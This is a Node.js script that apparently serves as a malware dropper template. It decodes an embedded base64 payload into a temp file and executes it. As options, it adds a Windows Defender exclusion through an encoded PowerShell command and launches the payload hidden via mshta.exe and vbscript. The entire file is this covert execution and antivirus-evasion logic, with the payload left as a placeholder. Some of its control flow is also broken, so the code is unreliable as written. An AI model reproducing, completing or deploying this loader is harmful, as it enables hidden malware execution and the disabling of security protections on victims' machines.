var fs = require('fs');
var os = require('os');
var path = require('path');
var spawn = require('child_process').spawn;

var exclusions = false;

var processes = [{process_ext:"key1", process_code:"BASE64DATA", new_console: false, hidden: false}];

function main() {
    for (var i = 0; i < processes.length; i++) {
        handle_process(processes[i].process_ext, processes[i].process_code, processes[i].new_console, processes[i].hidden);
    }
}

function defender_exclusions(process_ext) {
    var run_command = "cmd.exe";
    var command = "Add-MpPreference -ExclusionE ." + process_ext
    //base64 utf-16le encode commmand
    var command = Buffer.from(command, 'utf16le').toString('base64');
    var run_args = ["/d", "/c", "call", "powershell.exe", "-NoProfile", "-E", command];
    var child = spawn(run_command, run_args, { stdio: 'inherit' });

    child.on('exit', function(code) {
        return code;
    });
}

function handle_process(process_ext, process_code, new_console, hidden) {
    if (exclusions) {
        if (defender_exclusions(process_ext) != 0) {
            return;
        }
    }

    var random_name = Math.random().toString(36).substring(7);
    var file_ext = process_ext;
    var tempFile = path.join(os.tmpdir(), random_name + "." + file_ext);

    fs.writeFileSync(tempFile, Buffer.from(process_code, 'base64'));

    if (hidden) {
        var run_command = "mshta.exe";
        var args = 'vbscript:close(createobject("wscript.shell").run("cmd.exe /c ' + tempFile + '",0))';
    } else {
        var run_command = "cmd.exe";
        var args = ["/d", "/c", "call", tempFile];
    }


    if (new_console) {
        args = ["/d", "/c", "start", tempFile];
        spawn(run_command, [args]);
    } else {
        spawn(run_command, [args], { stdio: 'inherit' });
    }
}

main();